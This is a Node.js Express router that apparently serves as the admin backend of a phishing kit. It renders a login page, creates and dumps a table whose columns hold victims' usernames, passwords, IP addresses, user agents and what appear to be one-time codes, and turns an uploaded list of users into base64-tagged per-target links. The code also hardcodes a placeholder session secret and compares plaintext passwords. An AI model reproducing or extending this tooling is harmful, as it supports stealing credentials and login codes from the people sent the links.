const express = require('express');
const router = express.Router()
const db = require('../db');
//const dbu =  require('../dbu');
const bodyParser = require('body-parser');
const session = require('express-session');
const fs = require('fs');
const multer = require('multer');

const storage = multer.memoryStorage(); // Store the file in memory
const upload = multer({ storage: storage });



router.use(bodyParser.urlencoded({ extended: true }));
router.use(session({
    secret: 'your-secret-key',
    resave: true,
    saveUninitialized: true
}));



router.get("/", function(req, res,){


  const loginPage = `<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Design by foolishdeveloper.com -->
    <title>Welcome</title>
    <link rel="shortcut icon" href=" https://duckduckgo.com/favicon.ico" type="image/x-icon">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet">
 
    <!--Stylesheet-->
    <style media="screen">

      *,
*:before,
*:after{
    padding: 0;
    margin: 0;
    box-sizing: border-box;
}
body{
    background-color: #080710;
}
.background{
    width: 430px;
    height: 520px;
    position: absolute;
    transform: translate(-50%,-50%);
    left: 50%;
    top: 50%;
}
.background .shape{
    height: 200px;
    width: 200px;
    position: absolute;
    border-radius: 50%;
}
.shape:first-child{
    background: linear-gradient(
        #1845ad,
        #23a2f6
    );
    left: -80px;
    top: -80px;
}
.shape:last-child{
    background: linear-gradient(
        to right,
        #ff512f,
        #f09819
    );
    right: -30px;
    bottom: -80px;
}
form{
    height: auto;
    width: 400px;
    background-color: rgba(255,255,255,0.13);
    position: absolute;
    transform: translate(-50%,-50%);
    top: 50%;
    left: 50%;
    border-radius: 10px;
    backdrop-filter: blur(10px);
    border: 2px solid rgba(255,255,255,0.1);
    box-shadow: 0 0 40px rgba(8,7,16,0.6);
    padding: 50px 35px;
}
form *{
    font-family: 'Poppins',sans-serif;
    color: #ffffff;
    letter-spacing: 0.5px;
    outline: none;
    border: none;
}
form h3{
    font-size: 32px;
    font-weight: 500;
    line-height: 42px;
    text-align: center;
}

label{
    display: block;
    margin-top: 30px;
    font-size: 16px;
    font-weight: 500;
}
input{
    display: block;
    height: 50px;
    width: 100%;
    background-color: rgba(255,255,255,0.07);
    border-radius: 3px;
    padding: 0 10px;
    margin-top: 8px;
    font-size: 14px;
    font-weight: 300;
}
::placeholder{
    color: #e5e5e5;
}
button{
    margin-top: 50px;
    width: 100%;
    background-color: #ffffff;
    color: #080710;
    padding: 15px 0;
    font-size: 18px;
    font-weight: 600;
    border-radius: 5px;
    cursor: pointer;
}
.social{
  margin-top: 30px;
  display: flex;
}
.social div{
  background: red;
  width: 150px;
  border-radius: 3px;
  padding: 5px 10px 10px 5px;
  background-color: rgba(255,255,255,0.27);
  color: #eaf0fb;
  text-align: center;
}
.social div:hover{
  background-color: rgba(255,255,255,0.47);
}
.social .fb{
  margin-left: 25px;
}
.social i{
  margin-right: 4px;
}
 .error {
            color: red;
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="background">
        <div class="shape"></div>
        <div class="shape"></div>
    </div>


        <form action="/backend/login" method="post">
            
        <h3>Authenticate Here To Login</h3>


        <!-- Display error message if there's an error -->
        

        <label for="username">Username</label>
        <input type="text" placeholder="Email or Phone" name="username" id="username">

        <label for="password">Password</label>
        <input type="password" placeholder="Password" name="password" id="password">
        <button type="submit">Login</button>
        <!-- <button type="submit">Log In</button> -->
        <div class="social">
          <div class="go"><i class="fab fa-google"></i>  Google</div>
          <div class="fb"><i class="fab fa-facebook"></i>  Facebook</div>
        </div>
    </form>

</body>
</html>`;

if (req.session.loggedin) {
  res.render('index',{ message: '' });
} else {
    res.send(loginPage);
}
});

router.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  if (username && password) {

 

      db.query('SELECT * FROM users WHERE username = ? AND password = ?', [username, password], (error, results, fields) => {
        
          if (results.length > 0) {
              req.session.loggedin = true;
              req.session.username = username;
              res.redirect('/backend');
          } else {
              res.send('Incorrect username or password. Please try again.');
          }
          res.end();
      });
  } else {
      res.send('Please enter username and password.');
      res.end();
  }
});






router.post('/', (req, res) => {
  const { create, delete:newdel, getdata, genurl } = req.body;

if (create) {
      // Handle the "Create Table" button click
      // Your code for creating a table goes here

            const createTableSQL = `
            CREATE TABLE IF NOT EXISTS newtable (
              id INT AUTO_INCREMENT PRIMARY KEY,
              username VARCHAR(255),
              password VARCHAR(255),
              ip VARCHAR(255) NOT NULL,
              useragent VARCHAR(255) NOT NULL,
              date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
              pagetype VARCHAR(255),
              code VARCHAR(255),
              code2 VARCHAR(255),
              notify VARCHAR(20) DEFAULT 0
            )
            `;
                
                db.query(createTableSQL, (err, result) => {
            if (err) {
                console.error('Error creating table:', err);
            } else {
                console.log('Table created successfully');
            }
      
    });
      
    res.render('index', { message: 'Table Created' }); 
  
  } else if (newdel) {
    const tableName = 'newtable'; // Replace with the name of the table to delete

    // SQL query to delete the table
    const deleteQuery = `DROP TABLE ${tableName}`;
  
    // Execute the query to delete the table
    db.query(deleteQuery, (err, result) => {
        if (err) {
            console.error('Error deleting table:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.render('index', { message: 'Table Deleted' }); 
    });
  } else if (getdata) {
      // Handle the "Get Data" button click
      // Your code for retrieving data goes here
      const query = 'SELECT * FROM newtable'; // Replace with your table name
  
    db.query(query, (err, results) => {
      if (err) {
        console.error('Error executing the query: ' + err.stack);
        return res.status(500).send('Error fetching data from the database.');
      }

      if (results.length === 0) {
        // Handle the case when no rows were returned
        return res.render('index', { message: 'No Entry In The Table' }); 
      }
   // Store the data in a variable
      const data = Object.values(JSON.parse(JSON.stringify(results)));
     
      res.render('table', {data});
  
    });

  } else if (genurl) {

    res.render('newurl');

  } else {
      // Handle any other case
      res.send('Unknown action');
  }
  
  
  
  
  
});


router.post('/upload', upload.single('textFile'), (req, res) => {
  // Access the uploaded file from req.file
  const url = req.body.url;
  const key = req.body.key;
  const uploadedFile = req.file;

  // Check if a file was uploaded
  if (!uploadedFile) {
      return res.status(400).send('No file uploaded.');
  }

  // Ensure the uploaded file is a text/plain file
  if (uploadedFile.mimetype !== 'text/plain') {
      return res.status(400).send('Only text files are allowed.');
  }

  // Read the content of the uploaded text file
  const fileContent = uploadedFile.buffer.toString('utf-8');
  const line = fileContent.split('\n');
  const b64user = line.map((str) => Buffer.from(str).toString('base64'));
  const links = b64user.map((str) => `${url}${key}${str}`);  
  res.render('url', { title:'USER LIST WITH URL', line, links });

  
  // Display the content in the response or perform other actions
  
  
});




module.exports = router;
